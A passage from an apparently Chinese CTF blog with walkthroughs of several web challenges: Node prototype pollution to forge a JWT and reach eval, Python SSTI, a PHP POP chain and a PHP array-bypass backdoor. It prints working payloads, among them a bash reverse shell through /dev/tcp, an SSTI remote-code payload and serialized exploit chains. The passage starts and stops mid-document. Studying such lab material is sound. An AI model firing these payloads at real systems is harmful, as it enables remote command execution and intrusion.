= <span class="built_in">eval</span>(tmp_user.<span class="property">code</span>);</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;something happend~&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server running at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>目的是要到eval那里，需要已经登录</p></li><li><p>jwt验证，<em><strong>jwt的关键在于密钥这个思想</strong></em>，要知道用户名但是通过逻辑可以知道各种属性都是存储在内存中且sercretKey不会强制赋值，所以可以通过merge污染一下</p></li><li><p>思路: 先login post后再&#x2F;，执行命令</p><ol><li>先&#x2F;login污染一下secretKey，设置一下code看看可不可以执行成功？测一个没污染secretKey和有污染secretKey的，结论是可以绕过</li><li>能不能判断code有无执行-&gt;逻辑上secretKey可以code也可以，可以通过报错？执行一个有错误的code会回到Invailed Token?因为异常上传了</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !!!成功绕过</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;http://192.168.18.21&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. S1：访问/login设置tmp_user，第一步发一次就好</span></span><br><span class="line"></span><br><span class="line">postdata = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;hello&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;nothing&quot;</span>,</span><br><span class="line">    <span class="string">&quot;secretKey&quot;</span>: <span class="string">&quot;1&quot;</span>,   <span class="comment"># 默认使用HS256</span></span><br><span class="line">    <span class="string">&quot;code&quot;</span>: <span class="string">&quot;console.log(1)&quot;</span></span><br><span class="line">    <span class="comment"># 最后一步需要进行绕过bro，node命令执行绕过了,pp2rce几乎不可以</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(host + <span class="string">&quot;/login&quot;</span>, data=postdata)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. S2: 直接get/来进行命令执行</span></span><br><span class="line"></span><br><span class="line">getheader = &#123;</span><br><span class="line">    <span class="string">&quot;authorization&quot;</span>: <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IktDMXpzNCJ9.xXc8Q7Vx6lBHHJL7vNKbRcnfmpqfObThUS7dgXKT544&quot;</span></span><br><span class="line">    <span class="comment"># token，详见jwt.io</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(host,headers=getheader)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></li><li><p>呜呜死在这里的绕过上了，不过也学到了node的绕过，<strong>强网Pyblockly</strong>中通过函数覆盖来逃脱检查，这里也一样，想过覆盖inpui没想到覆盖check，失误了</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先发包这个</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;kc1zs4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;123456&quot;</span>,</span><br><span class="line">    <span class="string">&quot;secretKey&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>:<span class="string">&quot;check=(str)=&gt;true&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再发payload即可，这里命名空间是在该文件中，eval执行的</span></span><br><span class="line"><span class="comment"># 经典反弹shell</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;kc1zs4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;123456&quot;</span>,</span><br><span class="line">    <span class="string">&quot;secretKey&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>:<span class="string">&quot;require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;)&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Python口算-复现-python-ssti"><a href="#Python口算-复现-python-ssti" class="headerlink" title="Python口算(复现): python ssti"></a>Python口算(复现): python ssti</h2><blockquote><p>是不是小猿口算？</p></blockquote><ol><li><p>开局一个页面，肯定有信息传输，后台刷新这样，截获然后发出，只有脚本有这种速度</p></li><li><p>其实就是写一个根据字符串计算结果的python脚本，开整(差不多这个意思就对了)</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://xxx&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="comment"># 假设直接返回表达式123+531*3=?</span></span><br><span class="line"><span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">    res = <span class="built_in">eval</span>(r.text[<span class="number">0</span>:-<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    postData = &#123;</span><br><span class="line">        <span class="string">&quot;answer&quot;</span>: res</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = requests.post(url, data=postData)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></li><li><p>可以拿到hint，<code>/static/f4dd790b-bc4e-48de-b717-903d433c597f</code>，考虑render_template的模板注入执行，但是需要绕过，我也不知道黑白名单是啥啊bro(本来昨天应该看这道的，比绕过notadmin好多了)</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">solved=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">global</span> current_expr</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 前端计算...</span></span><br><span class="line">    <span class="comment"># 通过计算...</span></span><br><span class="line"></span><br><span class="line">    username = <span class="string">&#x27;ctfer!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> whitelist_filter(username,whitelist_patterns):</span><br><span class="line">            <span class="keyword">if</span> blacklist_filter(username):</span><br><span class="line">                <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;你过关！&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, username=username, hint=<span class="string">&quot;f4dd790b-bc4e-48de-b717-903d433c597f&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>username payload:</p><ol><li>先fuzz一下吧，可以通过脚本fuzz来着，或者直接打payload，过了就过了，覆写黑白名单也不是不行，但是这里没法试一试也没有具体信息</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line">cmd=cmd.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line">payload=<span class="string">f&#x27;&#x27;&#x27;&#123;&#123;&#123;&#123;lipsum.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(bytes.fromhex(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;).decode()).read()&quot;)&#125;&#125;&#125;&#125;&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="一些Tricks"><a href="#一些Tricks" class="headerlink" title="一些Tricks"></a>一些Tricks</h2><ol><li>对于<strong>重复定义函数绕过黑白名单</strong>的情况<ol><li>要注意函数的定义前后解析情况，路由外部定义的全局还是路由函数内部定义的，如果是路由内定义估计无法覆盖</li></ol></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>最重要的一句话：你别急，状态是最重要的，<em><strong>多思考</strong></em></li><li>fileread<ol><li>脚本慢慢看，查阅资料还是树状比较好，<em><strong>不会先思考再查</strong></em></li><li><em><strong>每一个切入点都很重要</strong></em>，需要rce，又file_get_contents就可以查php file_get_contents rce</li></ol></li><li>notadmin<ol><li>目的导向式的寻找切入点，<em><strong>从sink出发</strong></em></li><li>本地测测打不打得通!逻辑判断比如code污染的类推，<em><strong>开发有测试驱动，安全则是poc和res驱动，能快还是快，不能快还是要poc，晕也要poc</strong></em></li><li>思路可以跳脱一点，像黑名单这种可以看看能不能暴力覆盖或者直接跳过，<em><strong>要绕很久一般，覆盖只要一会，想一想</strong></em><ol><li>覆盖函数用到的思想是<strong>函数也是对象</strong>，通过后赋值指向别的地址来实现</li></ol></li></ol></li><li>python口算<ol><li><em><strong>找入口点</strong></em>：特征&#x2F;现象-&gt;可能原理&#x2F;唯一入口</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pcb23复现</title>
      <link href="/2024/11/08/pcb23%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/11/08/pcb23%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.yuque.com/dat0u/ctf">感谢ctf复现计划</a></p></blockquote><h2 id="web01-php-pop链"><a href="#web01-php-pop链" class="headerlink" title="web01: php pop链"></a>web01: php pop链</h2><ol><li><p>源码</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exp</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hacker</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hacker-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$finish</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;finish-&gt;<span class="title function_ invoke__">hacker</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hacker</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$parms1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$parms1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hacker-&gt;<span class="title function_ invoke__">welcome</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">welcome</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">welcome</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;welcome~ &quot;</span>.<span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">R</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">welcome</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="literal">true</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;finish1-&gt;name) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;finish-&gt;finish) &#123;</span><br><span class="line">                <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;method,<span class="variable">$this</span>-&gt;args);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nonono</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|system|eval|flag/i&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&quot;pop&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">nonono</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>一眼pop链，得加速了，等下应该开很多人</p></li><li><p>过滤系统函数，字符串变少，过滤直接&#96;反引号绕过</p></li><li><p>调用链</p><ol><li><p>直接H-&gt;Hacker不久可以读到&#x2F;flag文件，感觉是假的flag，但是还是要试一试，居然是真flag，也是不会爆0了</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实测可以调用到call_usr_function()</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">welcome</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">welcome</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;welcome~ &quot;</span>.<span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exp</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> <span class="title function_ invoke__">H</span>();</span><br><span class="line"><span class="variable">$exp</span> -&gt; username = <span class="keyword">new</span> <span class="title class_">Hacker</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>),<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure></li></ol></li></ol><h2 id="web02-php-scandir-和"><a href="#web02-php-scandir-和" class="headerlink" title="web02: php scandir 和 []"></a>web02: php scandir 和 []</h2><ol><li><p>源码</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&quot;5050f6511ffb64e1914be4ca8b9d585c&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">        <span class="variable">$title</span>= <span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>)&gt;<span class="number">5</span>||<span class="title function_ invoke__">strlen</span>(<span class="variable">$title</span>)&gt;<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!no!no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$sandbox</span>.<span class="variable">$title</span>,<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$title</span>)) &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;php &#x27;</span>.<span class="variable">$sandbox</span>.<span class="variable">$title</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$sandbox</span>.<span class="variable">$title</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!no!no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>ctrl+u源码，看到scandir()</p></li><li><p>同时给出提示<code>backdoor_[a-f0-9]&#123;16&#125;\.php</code></p></li><li><p>我刚学的通配符用上了: <code>scandir(&quot;glob://backdoor_[a-f0-9]*.php&quot;)</code></p></li><li><p>爆破出后门然后看看内容</p></li><li><p>php代码执行，目测数组绕过，存到Array里</p><ol><li>在<code>file_put_contents()</code>的时候数组转换是为空吗，但是这里有先字符串，所以还是Array文件</li><li>在<code>file_get_contents()</code>中数组并没有直接转成字符串，为空，判断符合，直接一套带走</li></ol></li><li><p>如果这里strlen无法绕过，可以考虑竞争一下，感觉可行，因为文件名是同一个</p></li><li><p>exp: wp中直接绕过<code>?username=exp&amp;title[]=123&amp;data[]=&lt;?=`nl+/*`;</code>刚好10个字符</p></li></ol><h2 id="escape-python-format-ssti"><a href="#escape-python-format-ssti" class="headerlink" title="escape: python format ssti"></a>escape: python format ssti</h2><blockquote><p>逆天原题杯 Helpful: [<a href="https://imaginaryctf.org/ArchivedChallenges/39]">https://imaginaryctf.org/ArchivedChallenges/39]</a></p></blockquote><ol><li><p><code>/source</code>源码路由</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 